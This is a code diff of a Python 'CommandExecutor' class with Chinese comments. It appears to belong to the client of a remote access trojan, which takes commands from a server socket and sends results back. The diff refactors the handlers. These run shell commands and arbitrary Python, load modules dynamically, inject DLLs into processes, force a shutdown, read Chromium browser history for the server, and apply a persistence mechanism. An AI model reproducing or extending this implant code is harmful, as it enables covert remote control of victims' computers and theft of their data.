@@ -10,6 +10,7 @@ import threading
 import time
 
 from client.util.decorator import desc, params, enclosing, require_admin, require_integrity
+from client.util.reflection_util import get_main_class
 from common.util import logger, get_time, format_dict, parse, get_size
 
 if os.name == 'nt':
@@ -31,15 +32,86 @@ class CommandExecutor:
         self.imported_modules = {}
 
     def execute_command(self, command_id, command):
+        """
+        执行命令
+        :param command_id: 命令id，用于set到该实例中，返回结果时指定对应的命令id
+        :param command: 命令字符串
+        :return: 执行结果元组（状态和消息）
+        """
+        # 将 command_id 设置为实例变量
         self.command_id = command_id
+        # 解析 command 得到函数名和其参数（如果有）
         name, arg = parse(command)
+        # 检查实例是否有一个与解析出的函数名相对应的方法
         if hasattr(self, name):
+            # 使用函数名获取方法对象
             func = getattr(self, name)
-            if len(inspect.signature(func).parameters):  # inspect.ismethod(func) and
-                return func(arg)
-            return func()
-        else:  # TODO：判断必须带desc才能执行
+            # 检查方法是否有 'desc' 注解
+            if hasattr(func, 'help'):
+                # 如果方法接受参数，则带上提供的参数调用它
+                if len(inspect.signature(func).parameters):
+                    return func(arg)
+                # 如果方法不接受参数，则无参数调用
+                return func()
+            else:
+                # 如果方法没有 'desc' 注解，则执行 'shell' 方法并将原始命令作为参数
+                return self.shell(command)
+        else:
+            # 如果不存在与解析出的名字相对应的方法，则执行 'shell' 方法并将原始命令作为参数
             return self.shell(command)
+
+    def read_stream(self, stream):
+        """
+        从输入流 stream 读取内容，并将每一行通过 send_to_server 方法发送到服务器。
+
+        Parameters:
+            stream (file-like object): 用于读取内容的输入流对象。
+
+        Returns:
+            None
+        """
+        while True:
+            # 从输入流读取一行数据
+            line = stream.readline()
+            # 如果没有更多数据可读取，则跳出循环
+            if not line:
+                break
+            # 将读取的字节转换为字符串，并去除行尾的换行符
+            self.send_to_server(1, line.decode(locale.getdefaultlocale()[1]).strip('\n'), 0)
+
+    def send_to_server(self, status, result, end):
+        self.socket.send_result(self.command_id, status, result, end)
+
+    def get_command_list(self):
+        methods = [name for name, method in inspect.getmembers(self, inspect.ismethod) if hasattr(method, 'help')]
+        return json.dumps(methods)
+
+    def dynamic_import(self, module):
+        # 获取模块路径
+        module_dir = os.path.join(get_working_directory(), 'client/util/modules/')
+        module_path = os.path.abspath(os.path.join(module_dir, module))
+
+        # 检查文件是否存在
+        if not os.path.isfile(module_path):
+            raise FileNotFoundError(f'File does not exist: {module_path}')
+
+        module_name, _ = os.path.splitext(os.path.basename(module_path))
+
+        # 导入模块
+        spec = importlib.util.spec_from_file_location(module_name, module_path)
+        module = importlib.util.module_from_spec(spec)
+        spec.loader.exec_module(module)
+
+        # 获取主类
+        cls = get_main_class(module, module_name)
+
+        # 实例化类并设置参数
+        instance = cls.get_instance()
+        instance.set_args(self.socket, self.command_id)
+
+        # 缓存实例化后的类对象
+        self.imported_modules[module_name] = instance
+        return instance
 
     @desc('execute shell command')
     def shell(self, command):
@@ -54,14 +126,7 @@ class CommandExecutor:
         else:
             return 1, ''
 
-    def read_stream(self, stream):
-        while True:
-            line = stream.readline()
-            if not line:
-                break
-            self.send_to_server(1, line.decode(locale.getdefaultlocale()[1]).strip('\n'), 0)
-
-    @desc('execute shell command and read data from stdout and stderr streams in parallel')
+    @desc('execute shell command and read from streams in parallel')
     def read(self, command):
         cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                stdin=subprocess.DEVNULL)
@@ -73,11 +138,15 @@ class CommandExecutor:
         stderr_thread.start()
         # 等待命令完成
         cmd.wait()
-        time.sleep(0.2)
+        time.sleep(0.1)
         self.send_to_server(1, "Command completed successfully", 1)
 
-    def send_to_server(self, status, result, end):
-        self.socket.send_result(self.command_id, status, result, end)
+    @desc('execute shell command without waiting for results')
+    def run(self, command):
+        if not command:
+            return 0, ''
+        p = subprocess.Popen(command, creationflags=subprocess.CREATE_NEW_CONSOLE)
+        return 1, 'Process created: {}'.format(p.pid)
 
     @desc('download file')
     def download(self, filename):
@@ -115,13 +184,8 @@ class CommandExecutor:
                    if hasattr(method, 'help')}
         return 1, format_dict({name: method.help for name, method in methods.items()})
 
-    def get_command_list(self):
-        methods = [name for name, method in inspect.getmembers(self, inspect.ismethod) if hasattr(method, 'help')]
-        return json.dumps(methods)
-
-    @staticmethod
     @desc('change directory')
-    def cd(path):
+    def cd(self, path):
         if not path:
             return 1, ''
         if os.path.isdir(path):
@@ -129,12 +193,6 @@ class CommandExecutor:
             return 1, ''
         else:
             return 0, 'Cannot find the path specified'
-
-    def run(self, command):
-        if not command:
-            return 0, ''
-        p = subprocess.Popen(command, creationflags=subprocess.CREATE_NEW_CONSOLE)
-        return 1, 'Process created: {}'.format(p.pid)
 
     @desc('execute python code')
     def pyexec(self, code, kwargs=None):
@@ -157,41 +215,7 @@ class CommandExecutor:
         self.socket.send_file(self.command_id, filename)
         os.remove(filename)
 
-    def dynamic_import(self, module):
-        # 获取模块路径
-        module_dir = os.path.join(get_working_directory(), 'client/util/modules/')
-        module_path = os.path.abspath(os.path.join(module_dir, module))
-
-        # 检查文件是否存在
-        if not os.path.isfile(module_path):
-            raise FileNotFoundError(f'File does not exist: {module_path}')
-
-        module_name, _ = os.path.splitext(os.path.basename(module_path))
-
-        # 导入模块
-        spec = importlib.util.spec_from_file_location(module_name, module_path)
-        module = importlib.util.module_from_spec(spec)
-        spec.loader.exec_module(module)
-
-        # 获取主类
-        cls = self.get_main_class(module, module_name)
-
-        # 实例化类并设置参数
-        instance = cls.get_instance()
-        instance.set_args(self.socket, self.command_id)
-
-        # 缓存实例化后的类对象
-        self.imported_modules[module_name] = instance
-        return instance
-
-    def get_camel_case_class(self, module_name):
-        class_name = "".join(word.capitalize() for word in module_name.split("_"))
-        return class_name
-
-    def get_main_class(self, module, module_name):
-        return getattr(module, self.get_camel_case_class(module_name))
-
-    @desc('load module and execute in a new thread')
+    @desc('load module and execute in new thread')
     def load(self, arg):
         if not arg.strip():
             modules = []
@@ -203,7 +227,7 @@ class CommandExecutor:
             arg += '.py'
         module_name, _ = os.path.splitext(os.path.basename(arg))
         if module_name == 'module':
-            raise Exception(f'Not executable')
+            raise Exception(f'Base module not executable')
         if module_name in self.imported_modules and self.imported_modules.get(module_name).status:
             raise Exception(f'The module is already in progress')
 
@@ -223,6 +247,7 @@ class CommandExecutor:
         else:
             raise Exception(f'Failed to import module: {arg}')
 
+    @desc('stop loaded module')
     def stop(self, arg):
         if arg.endswith('.py'):
             # 使用切片去掉最后的 .py 部分
@@ -264,6 +289,30 @@ class CommandExecutor:
     def poweroff(self):
         ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
         ctypes.windll.ntdll.ZwShutdownSystem(2)
+
+    @desc('create a zip archive')
+    def zip(self, dir_name):
+        import pathlib
+        import shutil
+        import tempfile
+        tempdir = tempfile.mkdtemp()
+        dir_name = os.path.abspath(dir_name)
+        if not os.path.isdir(dir_name):
+            return 0, f'Directory does not exist: {dir_name}'
+        zip_name = os.path.basename(dir_name)
+        pardir = pathlib.Path(dir_name).resolve().parent
+        filename = shutil.make_archive(os.path.join(tempdir, zip_name), format='zip', root_dir=pardir,
+                                       base_dir=os.path.basename(dir_name))
+        return 1, f'Archive created: {filename}'
+
+    @desc('extract files from a zip archive')
+    def unzip(self, zip_name):
+        import shutil
+        zip_name = os.path.abspath(zip_name)
+        if not os.path.isfile(zip_name):
+            return 0, f'File does not exist: {zip_name}'
+        shutil.unpack_archive(zip_name, os.getcwd())
+        return 1, f'Archive extracted to {os.getcwd()}'
 
     @desc('inject DLL into process')
     @params('pid', 'dll_path')
@@ -308,30 +357,6 @@ class CommandExecutor:
             return 1, json.dumps(get_chromium_history(history), sort_keys=False, indent=2, ensure_ascii=False)
         else:
             return 0, 'Error: {}'.format(this.type)
-
-    @desc('create a zip archive')
-    def zip(self, dir_name):
-        import pathlib
-        import shutil
-        import tempfile
-        tempdir = tempfile.mkdtemp()
-        dir_name = os.path.abspath(dir_name)
-        if not os.path.isdir(dir_name):
-            return 0, f'Directory does not exist: {dir_name}'
-        zip_name = os.path.basename(dir_name)
-        pardir = pathlib.Path(dir_name).resolve().parent
-        filename = shutil.make_archive(os.path.join(tempdir, zip_name), format='zip', root_dir=pardir,
-                                       base_dir=os.path.basename(dir_name))
-        return 1, f'Archive created: {filename}'
-
-    @desc('extract files from a zip archive')
-    def unzip(self, zip_name):
-        import shutil
-        zip_name = os.path.abspath(zip_name)
-        if not os.path.isfile(zip_name):
-            return 0, f'File does not exist: {zip_name}'
-        shutil.unpack_archive(zip_name, os.getcwd())
-        return 1, f'Archive extracted to {os.getcwd()}'
 
     @desc('apply persistence mechanism')
     @enclosing
